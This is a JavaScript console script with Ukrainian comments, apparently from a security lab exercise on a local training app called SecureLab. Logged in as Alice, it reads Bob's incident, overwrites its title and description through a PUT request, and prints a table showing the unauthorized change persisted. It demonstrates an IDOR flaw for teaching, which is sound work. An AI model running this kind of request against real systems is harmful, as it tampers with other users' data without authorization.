// Виконувати в DevTools Console локального SecureLab.
// Передумова: виконано вхід як Alice.
// Пароль і значення cookie цей сценарій не читає та не друкує.

(async () => {
    const profileResponse = await fetch("/api/me");
    const profile = await profileResponse.json();

    if (
        profileResponse.status !== 200 ||
        profile.id !== "10000000-0000-0000-0000-000000000001"
    ) {
        throw new Error("Спочатку увійди як Alice.");
    }

    const bobId = "20000000-0000-0000-0000-000000000002";
    const url = `/api/incidents/${bobId}`;

    const beforeResponse = await fetch(url);

    if (beforeResponse.status !== 200) {
        throw new Error(
            `Читання Bob перед зміною: HTTP ${beforeResponse.status}. ` +
            "Цей сценарій призначений для початкового vulnerable state."
        );
    }

    const before = await beforeResponse.json();

    const marker = `LR04-IDOR-${Date.now()}`;

    const updateResponse = await fetch(url, {
        method: "PUT",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            title: marker,
            description: "Навчальна зміна інциденту Bob від імені Alice."
        })
    });

    const afterResponse = await fetch(url);

    if (afterResponse.status !== 200) {
        throw new Error(
            `Читання Bob після зміни: HTTP ${afterResponse.status}.`
        );
    }

    const after = await afterResponse.json();

    console.log("Суб’єкт запитів:", profile.userName, profile.id);
    console.log("Цільовий інцидент:", bobId);

    console.table([
        {
            action: "GET Bob до зміни",
            status: beforeResponse.status,
            title: before.title,
            owner: before.ownerDisplayName
        },
        {
            action: "PUT Bob від імені Alice",
            status: updateResponse.status,
            title: marker,
            owner: "—"
        },
        {
            action: "GET Bob після зміни",
            status: afterResponse.status,
            title: after.title,
            owner: after.ownerDisplayName
        }
    ]);

    console.log("Перевірка збереженого стану:", {
        titleChanged: before.title !== after.title,
        submittedTitlePersisted: after.title === marker,
        descriptionChanged: before.description !== after.description,
        statusUnchanged: before.status === after.status,
        severityUnchanged: before.severity === after.severity
    });
})();